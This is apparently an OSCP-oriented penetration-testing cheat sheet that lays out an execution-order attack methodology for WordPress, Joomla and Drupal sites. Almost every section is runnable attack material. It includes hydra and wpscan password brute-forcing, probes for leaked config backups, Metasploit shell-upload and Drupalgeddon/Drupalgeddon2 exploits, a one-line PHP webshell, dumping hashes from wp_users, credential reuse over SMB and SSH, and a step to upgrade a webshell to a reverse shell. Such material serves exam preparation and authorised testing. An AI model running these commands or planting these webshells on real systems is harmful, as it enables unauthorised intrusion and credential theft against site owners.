# CMS Pentest Methodology — WordPress / Joomla / Drupal

Execution-order reference for identifying and exploiting the three most common OSCP CMS targets. Fingerprint first, then follow the matching track.

---

## 0. Fingerprinting (always first)

```bash
whatweb -a 3 http://<target>/
curl -s -I http://<target>/ | grep -iE "x-powered-by|server"
curl -s http://<target>/ | grep -iE "wp-content|joomla|drupal|sites/default"
```

|Signal|CMS|
|---|---|
|`/wp-content/`, `/wp-includes/`, `wp-login.php`|WordPress|
|`/administrator/`, `com_content`, `Joomla!` in generator meta|Joomla|
|`/sites/default/`, `CHANGELOG.txt`, `Drupal.settings` in page source|Drupal|

**Decision point:** route to the matching section below. If nothing matches, treat as generic web app (out of scope here).

---

## 1. WordPress

### 1.1 Enumeration

```bash
wpscan --url http://<target>/ --enumerate vp,vt,u,cb,dbe --api-token <token>
# no API token / offline:
wpscan --url http://<target>/ --enumerate vp,vt,u,cb,dbe

curl -s http://<target>/wp-json/wp/v2/users | jq
curl -s http://<target>/?author=1 -I   # user enum via author redirect
for i in 1 2 3 4 5; do curl -s -o /dev/null -w "%{http_code} $i\n" http://<target>/?author=$i; done

curl -s http://<target>/wp-content/debug.log
curl -s http://<target>/wp-config.php.bak
curl -s http://<target>/.wp-config.php.swp
```

**Decision point:** vulnerable plugin/theme found by wpscan → `searchsploit <plugin name>` and check ExploitDB/WPVulnDB entry for exact version match before firing.

### 1.2 Credential attack

```bash
wpscan --url http://<target>/ --usernames <userlist> --passwords /usr/share/wordlists/rockyou.txt \
  --max-threads 5

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect password"
```

Exam-safety: cap threads, wpscan brute-force is noisy — prefer it only after plugin/theme vectors are exhausted.

### 1.3 Authenticated RCE (admin/editor creds obtained)

```bash
# Theme Editor -> arbitrary PHP write (needs Administrator role)
# Appearance > Theme Editor > 404.php, paste PHP webshell, save
curl -s "http://<target>/wp-content/themes/<active-theme>/404.php?cmd=id"

# Plugin upload path (needs Administrator, plugin upload capability)
msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS <target>; \
  set USERNAME <user>; set PASSWORD <pass>; set TARGETURI /; run"
```

### 1.4 Unauthenticated vectors

```bash
# XML-RPC pingback / brute-force amplification (rarely exam-relevant, note only)
curl -s -X POST http://<target>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Known plugin/theme CVE (example pattern — always confirm version first)
searchsploit wordpress plugin <name>
```

### 1.5 WordPress reference table

|Finding|Technique|
|---|---|
|Outdated plugin/theme (wpscan)|searchsploit → matching PoC|
|Admin creds obtained|Theme Editor RCE / plugin upload → webshell|
|`wp-config.php` readable (LFI/backup file)|DB creds → reuse on MySQL/phpMyAdmin/SSH|
|Weak/default creds|Credential brute (1.2)|
|REST API user enum works|Feed usernames into 1.2 brute list|

---

## 2. Joomla

### 2.1 Enumeration

```bash
joomscan -u http://<target>/
droopescan scan joomla -u http://<target>/

curl -s http://<target>/administrator/manifests/files/joomla.xml | grep version
curl -s http://<target>/README.txt | head -5
curl -s http://<target>/configuration.php.bak
curl -s http://<target>/configuration.php~
```

**Decision point:** version identified → `searchsploit joomla <version>` before anything else; Joomla core CVEs are version-pinned, don't guess.

### 2.2 Credential attack

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Username and password do not match"
```

### 2.3 Authenticated RCE (admin creds obtained)

```bash
# Template Editor -> arbitrary PHP write (Extensions > Templates > Templates > <template> > edit index.php)
curl -s "http://<target>/templates/<template-name>/index.php?cmd=id"

# Automated version
msfconsole -q -x "use exploit/unix/webapp/joomla_template_edit; set RHOSTS <target>; \
  set JOOMLA_USER <user>; set JOOMLA_PASS <pass>; run"
```

### 2.4 Unauthenticated vectors

```bash
# Joomla < 3.4.6 object injection (CVE-2015-8562) — check version match exactly
searchsploit joomla 3.4 object injection

# com_* extension SQLi — enumerate installed extensions first
curl -s http://<target>/administrator/index.php?option=com_<extension>
```

### 2.5 Joomla reference table

|Finding|Technique|
|---|---|
|Version < 3.4.6|CVE-2015-8562 object injection RCE|
|Admin creds obtained|Template editor RCE (2.3)|
|`configuration.php` leaked|DB creds → reuse|
|Vulnerable `com_*` component|searchsploit component name + version|

---

## 3. Drupal

### 3.1 Enumeration

```bash
droopescan scan drupal -u http://<target>/
curl -s http://<target>/CHANGELOG.txt | head -5
curl -s http://<target>/core/CHANGELOG.txt | head -5   # Drupal 8+

curl -s http://<target>/user/login
```

**Decision point:** version < 7.32 → Drupalgeddon (SQLi→RCE). Version 7.x/8.x with SA-CORE-2018-002 window → Drupalgeddon2. Always confirm the exact version string before firing either.

### 3.2 Drupalgeddon (CVE-2014-3704) — Drupal < 7.32

```bash
searchsploit drupal 7 sqli
python2 drupalgeddon.py -t http://<target>/ -u <new_admin> -p <new_pass>
# manual SQLi: mass-assignment via name[0; INSERT ...]= in login form
```

### 3.3 Drupalgeddon2 (CVE-2018-7600) — pre-auth RCE

```bash
searchsploit drupal drupalgeddon2
python3 drupalgeddon2.py http://<target>/ "id"

msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <target>; run"
```

### 3.4 Authenticated RCE (admin creds obtained)

```bash
# PHP Filter module (Drupal 7, if module enabled) -> create node with PHP code
# Content > Add content > Basic page, body format = PHP code:
<?php system($_GET['cmd']); ?>

# Drupal 8+: PHP filter removed from core — use module upload instead
# Extend > install a malicious .info.yml + .php module archive, or use existing file upload field
```

### 3.5 Drupal reference table

|Finding|Technique|
|---|---|
|Version < 7.32|Drupalgeddon SQLi→RCE (3.2)|
|SA-CORE-2018-002 window|Drupalgeddon2 pre-auth RCE (3.3)|
|Admin creds + PHP filter module|Inline PHP node execution (3.4)|
|`sites/default/settings.php` leaked|DB creds → reuse|

---

## 4. Common post-compromise (all three CMS)

```bash
# Harvest DB creds from config files already located above
mysql -u <user> -p'<pass>' -h <target> -e "show databases;"
mysql -u <user> -p'<pass>' -h <target> -e "select user,pass from wp_users;"   # WP hashes are phpass — hashcat -m 400

# Password reuse check
crackmapexec smb <target> -u <user> -p '<pass>'
ssh <user>@<target>

# Upgrade webshell to reverse shell once PHP execution is confirmed
curl -s "http://<target>/<path-to-shell>.php?cmd=<url-encoded-revshell>"
```

---

## 5. Priority-ordered fast path (try first)

1. Fingerprint CMS + version → check for a version-specific unauth RCE (Drupalgeddon2, Joomla object injection) before anything else.
2. Run the CMS-specific scanner (wpscan / joomscan / droopescan) for outdated plugins/components — highest real-world hit rate.
3. Check for exposed config/backup files (`wp-config.php.bak`, `configuration.php~`, `settings.php`) — instant DB creds, often reused on SSH.
4. If creds obtained (any source) → authenticated theme/template/module editor RCE — reliable, low-noise.
5. Only fall back to credential brute-forcing (hydra/wpscan passwords) last — slow and noisy, save for when nothing above lands.

---

**Report reminder:** for each command above, log the specific enumeration output that justified running it (version string, exposed file, wpscan finding) — OSCP grading credits documented reasoning, not just the final shell.